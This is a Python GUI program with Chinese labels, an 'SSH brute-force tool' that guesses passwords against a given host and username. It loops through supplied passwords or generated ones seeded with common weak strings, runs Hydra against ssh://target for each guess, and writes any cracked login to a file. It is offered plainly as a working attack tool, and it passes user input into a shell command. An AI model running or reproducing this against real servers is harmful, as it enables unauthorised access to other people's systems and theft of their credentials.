import os
import random
import string
import subprocess
import tkinter as tk
from tkinter import messagebox
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from tkinter import filedialog
from PIL import Image, ImageTk

# 动态生成密码，加入一些常见的模式
def generate_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    common_patterns = ["123456", "password", "admin", "letmein", "welcome", "root", "qwerty", "123qwe"]
    password = random.choice(common_patterns)  # 从常见模式中随机选择
    if len(password) < length:
        password += ''.join(random.choices(chars, k=length - len(password)))  # 补充随机字符
    return password

# 调用Hydra爆破
def try_password(password, target, port, username):
    # 临时保存密码（为了传给Hydra），但不保留它们
    temp_file = "temp_password.txt"
    with open(temp_file, "w") as f:
        f.write(password + "\n")

    # 调用Hydra
    hydra_command = f"hydra -l {username} -P {temp_file} -s {port} ssh://{target}"
    process = subprocess.Popen(hydra_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    stdout, stderr = process.communicate()

    # 删除临时密码文件
    os.remove(temp_file)

    # 返回Hydra的输出
    return stdout, stderr, password

# 启动爆破的主函数
def brute_force():
    target = entry_target.get()
    port = entry_port.get()
    username = entry_username.get()
    additional_passwords = entry_additional_passwords.get()

    if not target or not port or not username:
        messagebox.showerror("错误", "目标地址、端口和用户名不能为空！")
        return

    # 添加已知密码（如果有）
    passwords = additional_passwords.split(",") if additional_passwords else []
    
    # 如果没有已知密码，自动生成密码
    if not passwords:
        messagebox.showinfo("信息", "没有提供已知密码，使用自动生成的密码进行爆破。")

    # 打开终端输出区域
    output_text.config(state=tk.NORMAL)  # 允许编辑
    output_text.delete(1.0, tk.END)  # 清空之前的输出

    # 创建一个文件来保存破解成功的密码
    password_file = "cracked_password.txt"
    
    try:
        # 使用多线程处理密码爆破
        with ThreadPoolExecutor(max_workers=10) as executor:  # 控制并行数量
            while True:
                # 如果没有已知密码，使用自动生成的密码
                if not passwords:
                    password = generate_password()
                else:
                    password = passwords.pop(0)  # 从已知密码中获取

                # 显示正在尝试的密码
                output_text.insert(tk.END, f"尝试密码: {password}\n")
                output_text.yview(tk.END)  # 自动滚动到底部

                # 异步执行爆破任务
                future = executor.submit(try_password, password, target, port, username)

                # 获取结果
                stdout, stderr, tried_password = future.result()

                # 解析输出并在UI和终端显示
                if '1 valid password found' in stdout:
                    # 破解成功，保存密码
                    messagebox.showinfo("成功", f"密码破解成功！\n用户名: {username}\n密码: {tried_password}")
                    
                    # 将成功的密码写入文件
                    with open(password_file, "w") as f:
                        f.write(f"用户名: {username}\n")
                        f.write(f"密码: {tried_password}\n")
                    
                    # 输出到UI
                    output_text.insert(tk.END, f"密码破解成功，已保存到文件: {password_file}\n")
                    output_text.yview(tk.END)

                    break
                else:
                    # 错误密码输出
                    output_text.insert(tk.END, f"错误密码: {tried_password}\n")
                    output_text.yview(tk.END)
                    print(f"错误密码: {tried_password}")

    except KeyboardInterrupt:
        messagebox.showinfo("中止", "爆破已手动中止！")
    except Exception as e:
        messagebox.showerror("错误", f"发生错误: {e}")
    finally:
        output_text.config(state=tk.DISABLED)  # 禁止编辑输出区域

# 创建UI界面
root = tk.Tk()
root.title("SSH爆破工具")
root.geometry("600x500")

# 个人Logo图像加载
'''logo_path = "your_logo_path.png"  # 这里填写你的logo图片路径
try:
    img = Image.open(logo_path)
    img = img.resize((100, 100))
    logo = ImageTk.PhotoImage(img)
    logo_label = tk.Label(root, image=logo)
    logo_label.pack()
except Exception as e:
    messagebox.showerror("错误", f"Logo加载失败: {e}")
'''
# 输入框
label_target = tk.Label(root, text="目标地址:")
label_target.pack()
entry_target = tk.Entry(root)
entry_target.pack()

label_port = tk.Label(root, text="端口:")
label_port.pack()
entry_port = tk.Entry(root)
entry_port.pack()

label_username = tk.Label(root, text="用户名:")
label_username.pack()
entry_username = tk.Entry(root)
entry_username.pack()

label_additional_passwords = tk.Label(root, text="已知密码 (逗号分隔):")
label_additional_passwords.pack()
entry_additional_passwords = tk.Entry(root)
entry_additional_passwords.pack()

# 输出区域（显示Hydra的结果）
output_label = tk.Label(root, text="爆破过程输出:")
output_label.pack()

output_text = scrolledtext.ScrolledText(root, width=70, height=15, wrap=tk.WORD, state=tk.DISABLED)
output_text.pack()

# 开始爆破按钮
btn_start = tk.Button(root, text="开始爆破", command=brute_force)
btn_start.pack()

# 运行主循环
root.mainloop()


# QLz4 qoingling 